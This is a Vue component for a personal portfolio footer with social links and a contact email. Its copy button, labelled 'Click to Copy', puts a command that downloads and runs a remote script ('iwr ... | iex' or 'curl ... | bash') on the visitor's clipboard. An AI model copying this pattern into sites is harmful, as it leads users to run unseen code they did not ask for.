<template>
    <div id="back" class="wrapper">
        <div
            class="flex flex-col px-10 md:px-20 gap-6 font-gsans text-xl py-10 md:text-2xl text-white">
            <div class="flex flex-col md:flex-row gap-5 md:gap-6 items-start md:items-center">
                <a class="flex items-center gap-2" href="https://github.com/Glitchyi/">
                    <p class="link_effect">Github</p> <img class="md:w-8 md:h-8 w-5 h-5"
                        src="https://img.icons8.com/windows/96/FFFFFF/external-link-squared.png" alt="github link" />
                </a>
                <a class="flex items-center gap-2" href="https://www.linkedin.com/in/glitchy/">
                    <p class="link_effect">Linkedin</p> <img class="md:w-8 md:h-8 w-5 h-5"
                        src="https://img.icons8.com/windows/96/FFFFFF/external-link-squared.png" alt="linkedin link" />
                </a>
                <a class="flex items-center gap-2" href="https://twitter.com/advaithnarayan">
                    <p class="link_effect">Twitter</p> <img class="md:w-8 md:h-8 w-5 h-5"
                        src="https://img.icons8.com/windows/96/FFFFFF/external-link-squared.png" alt="twitter link" />
                </a>
                <a class="flex items-center gap-2" href="https://www.instagram.com/advaithnarayanan/">
                    <p class="link_effect">Instagram</p> <img class="md:w-8 md:h-8 w-5 h-5"
                        src="https://img.icons8.com/windows/96/FFFFFF/external-link-squared.png" alt="instagram link" />
                </a>
                <a class="flex items-center gap-2" href="https://t.me/Glitchyie">
                    <p class="link_effect">Telegram</p><img class="md:w-8 md:h-8 w-5 h-5"
                        src="https://img.icons8.com/windows/96/FFFFFF/external-link-squared.png" alt="telegram link" />
                </a>
            </div>
            <hr class="border-gray-600 my-2">
            <div class="flex flex-col md:flex-row gap-4 md:gap-5 md:items-center items-start text-gray-500">
                <p class="text-xl md:text-2xl">Contact me at: </p>
                <a href="mailto:advaith@glitchy.systems" class="text-xl md:text-2xl email_effect">advaith@glitchy.systems</a>
                <div class="flex items-center">
                    <div class="border hidden md:block p-1 border-sky-500 backdrop-blur-sm text-white text-center rounded-lg text-xs sm:text-sm"
                        @click="copyToClipboard">
                        <p id="cptext" class="p-2 copy-text">
                        <div class="cptext" :key="text">{{ text }}</div>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</template>

<script setup>
import { ref } from 'vue'

const text = ref("Click to Copy :D")

function detectOS() {
    try {
        if (navigator.userAgent.toLowerCase().indexOf("win") !== -1) {
            return "iwr -useb https://glitchy.systems/hey.ps1 | iex"
        } else {
            return "curl -s https://glitchy.systems/hey.sh | bash"
        }
    } catch {
        return null
    }
}

function copyToClipboard() {
    const command = detectOS()
    
    if (!command) {
        window.location.href = "https://glitchy.systems/ghost-astley-tokyo-music-video-smol.mp4"
        return
    }

    const elem = document.getElementById("cptext")
    if (!elem) return

    navigator.clipboard.writeText(command)
    elem.style.transition = "opacity 2s"
    text.value = "Copied to clipboard!"
    elem.innerHTML = "Copied to clipboard!"
    
    setTimeout(() => {
        elem.style.opacity = 0
    }, 2000)

    setTimeout(() => {
        elem.style.opacity = 1
        text.value = command
        elem.innerHTML = command
    }, 2000)
}
</script>

<style>
.link_effect {
    display: inline-block;
    position: relative;
    color: #b4e6ff;
}

.link_effect:after {
    content: '';
    position: absolute;
    width: 100%;
    transform: scaleX(0);
    height: 2px;
    bottom: 0;
    left: 0;
    background-color: #b4e6ff;
    transform-origin: bottom right;
    transition: transform 0.25s ease-out;
}

.link_effect:hover:after {
    transform: scaleX(1);
    transform-origin: bottom left;
}

.email_effect {
    display: inline-block;
    position: relative;
    color: #6b7280;
}

.email_effect:after {
    content: '';
    position: absolute;
    width: 100%;
    transform: scaleX(0);
    height: 2px;
    bottom: 0;
    left: 0;
    background-color: #6b7280;
    transform-origin: bottom right;
    transition: transform 0.25s ease-out;
}

.email_effect:hover:after {
    transform: scaleX(1);
    transform-origin: bottom left;
}


.fade-in-enter-active {
    transition: opacity 300ms cubic-bezier(0.55, 0.085, 0.68, 0.53);
}

.fade-in-leave-active {
    transition: opacity 225ms cubic-bezier(0.25, 0.46, 0.45, 0.94);
}

.fade-in-enter,
.fade-in-leave-to {
    opacity: 0;
}
</style>
